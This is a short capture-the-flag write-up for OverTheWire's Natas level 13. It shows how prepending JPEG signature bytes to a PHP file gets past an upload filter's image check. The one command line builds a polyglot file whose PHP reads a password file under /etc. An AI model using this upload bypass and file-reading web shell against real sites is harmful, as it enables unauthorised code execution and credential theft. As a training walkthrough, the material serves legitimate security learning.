This time the source code checks for the jpg extensions. 
<img title="inspect html" alt="Alt text" src="../image_resources/natas13_code.png">

So, in order to stil be able to upload a php file inside, we need to add some signature bytes of the image extension. So, my edited php content is like so:
```
echo -e "\xff\xd8\xff\xe0\n<?php echo exec(\"cat /etc/natas_webpass/natas14\"); ?>" >> natas13.jpg
```
the `\xFF\xD8\xFF` being the jpeg header bytes and saved as a jpg file.

Then following on from last level where we edited the file extension in console, we can get the password.

<img title="inspect html" alt="Alt text" src="../image_resources/natas13_bypass.png">

<img title="inspect html" alt="Alt text" src="../image_resources/natas13_pass.png">